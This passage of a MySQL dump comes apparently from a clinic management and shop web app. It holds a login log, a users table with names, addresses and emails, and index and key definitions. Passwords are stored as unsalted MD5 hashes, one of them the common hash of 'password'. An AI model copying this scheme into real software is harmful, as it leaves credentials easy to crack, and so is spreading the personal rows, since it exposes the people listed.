(147, NULL, 'admin', 0x3a3a3100000000000000000000000000, '2024-06-24 13:32:38', NULL, 0),
(148, 6, 'johnny@mail.com', 0x3a3a3100000000000000000000000000, '2024-06-24 13:33:35', NULL, 1),
(149, NULL, 'admin', 0x3a3a3100000000000000000000000000, '2024-06-30 13:48:47', NULL, 0),
(150, NULL, 'admin', 0x3a3a3100000000000000000000000000, '2024-06-30 13:48:52', NULL, 0);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` int(11) NOT NULL,
  `fullName` varchar(255) DEFAULT NULL,
  `address` longtext DEFAULT NULL,
  `city` varchar(255) DEFAULT NULL,
  `gender` varchar(255) DEFAULT NULL,
  `email` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `regDate` timestamp NULL DEFAULT current_timestamp(),
  `updationDate` timestamp NULL DEFAULT NULL ON UPDATE current_timestamp(),
  `cart_data` text DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `fullName`, `address`, `city`, `gender`, `email`, `password`, `regDate`, `updationDate`, `cart_data`) VALUES
(3, 'Erika', 'Commonwealth', 'Quezon City', 'female', 'ferolinoerika@gmail.com', '32250170a0dca92d53ec9624f336ca24', '2023-11-19 10:43:52', '0000-00-00 00:00:00', NULL),
(4, 'Nicole', 'Mindanao Ave.', 'Quezon City', 'female', 'nicole@gmail.com', '32250170a0dca92d53ec9624f336ca24', '2023-11-19 13:14:47', NULL, NULL),
(5, 'john', 'jan lang', 'haha', 'male', 'john@mail.com', '5f4dcc3b5aa765d61d8327deb882cf99', '2023-11-26 08:13:39', '2023-12-05 17:18:46', 'a:2:{i:72;i:1;i:71;i:1;}'),
(6, 'johnny', 'jan', 'lang', 'male', 'johnny@mail.com', 'cc03e747a6afbbcbf8be7668acfebee5', '2024-06-24 13:33:20', NULL, NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `appointment`
--
ALTER TABLE `appointment`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `contact`
--
ALTER TABLE `contact`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `doctors`
--
ALTER TABLE `doctors`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `doctorslog`
--
ALTER TABLE `doctorslog`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `doctorspecilization`
--
ALTER TABLE `doctorspecilization`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `orders`
--
ALTER TABLE `orders`
  ADD PRIMARY KEY (`id`),
  ADD KEY `user_id` (`user_id`),
  ADD KEY `product_id` (`product_id`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `tblmedicalhistory`
--
ALTER TABLE `tblmedicalhistory`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `tblpatient`
--
ALTER TABLE `tblpatient`
  ADD PRIMARY KEY (`ID`);

--
-- Indexes for table `userlog`
--
ALTER TABLE `userlog`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD KEY `email` (`email`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `appointment`
--
ALTER TABLE `appointment`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `contact`
--
ALTER TABLE `contact`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=115;

--
-- AUTO_INCREMENT for table `doctors`
--
ALTER TABLE `doctors`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- AUTO_INCREMENT for table `doctorslog`
--
ALTER TABLE `doctorslog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=32;

--
-- AUTO_INCREMENT for table `doctorspecilization`
--
ALTER TABLE `doctorspecilization`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- AUTO_INCREMENT for table `orders`
--
ALTER TABLE `orders`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=74;

--
-- AUTO_INCREMENT for table `tblmedicalhistory`
--
ALTER TABLE `tblmedicalhistory`
  MODIFY `ID` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `tblpatient`
--
ALTER TABLE `tblpatient`
  MODIFY `ID` int(10) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `userlog`
--
ALTER TABLE `userlog`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=151;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=7;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `orders`
--
ALTER TABLE `orders`
  ADD CONSTRAINT `orders_ibfk_1` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`),
  ADD CONSTRAINT `orders_ibfk_2` FOREIGN KEY (`product_id`) REFERENCES `products` (`id`);
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
